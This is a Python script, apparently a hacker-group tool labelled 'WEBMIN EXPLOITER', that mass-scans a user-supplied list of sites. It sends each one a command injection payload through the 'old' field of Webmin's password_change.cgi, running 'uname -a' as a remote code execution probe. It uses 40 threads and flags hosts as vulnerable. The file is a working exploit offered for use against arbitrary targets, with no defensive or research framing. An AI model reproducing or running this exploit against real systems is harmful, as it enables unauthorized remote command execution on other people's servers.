#python3
#WEBMIN EXPLOITER 
#ZEKKEL AR
import sys, os
import requests
from multiprocessing.dummy import Pool as ThreadPool
from time import time as timer
from platform import system	
from colorama import Fore								
from colorama import Style								
from pprint import pprint								
from colorama import init
from bs4 import BeautifulSoup
fr  =   Fore.RED											
fc  =   Fore.CYAN											
fw  =   Fore.WHITE											
fg  =   Fore.GREEN											
sd  =   Style.DIM											
sn  =   Style.NORMAL										
sb  =   Style.BRIGHT
try:
	ganteng = input('ur files => ')
	f= open(ganteng, 'r') 
	woh = f.read().splitlines()
except IOError:
	pass
woh = list((woh))

def Domains(url):

	if '://' not in url:
		return "http://" + url
	else:
		return url
def banner():
	print("""
		[+] Zekkel AR
		[+] WebMIN RCE
	""")
def webmin(site):
	try:
		url = Domains(site)
		path_port = url+':10000'
		path = '{}:10000/password_change.cgi' .format(url)
		headers = {
			'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0',
			'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
			'Accept-Language': 'en-US,en;q=0.5',
			'Accept-Encoding': 'gzip, deflate',
			'Referer': url+':10000/session_login.cgi',
			'Cookie': 'redirect=1; testing=1; sid=x',
			'Connection': 'close',
			'Upgrade-Insecure-Requests': '1',
			'Content-Type': 'application/x-www-form-urlencoded',
			'Content-Length': '47'
		} 
		command = ('uname -a')

		payload = 'user=root&pam=&expired=2&old=id|' + command + '&new1=wheel&new2=wheel'
		r = requests.post(path, data=payload, headers = headers, verify = False).text
		if 'Failed to change password : The current password is incorrect' in r:
			print(r)
			print('[ {}VULNERABLE ] {}{}' .format(fc,fg,url))
		else:
			print('{}[ {}NOT VULNERABLE {}] {}{}' .format(fc,fr,fc,fg,path_port))
	except Exception as bs:
		print(bs)


def Run_Work(site):
	url = Domains(site)
	webmin(url)
os.system('clear')
banner()
def Main():

	try:
		start = timer()
		pp = ThreadPool(40)
		pr = pp.map(Run_Work, woh)
		print('Time: ' + str(timer() - start) + ' seconds')
	except Exception as e:
		print(e)
if __name__ == "__main__":
	Main()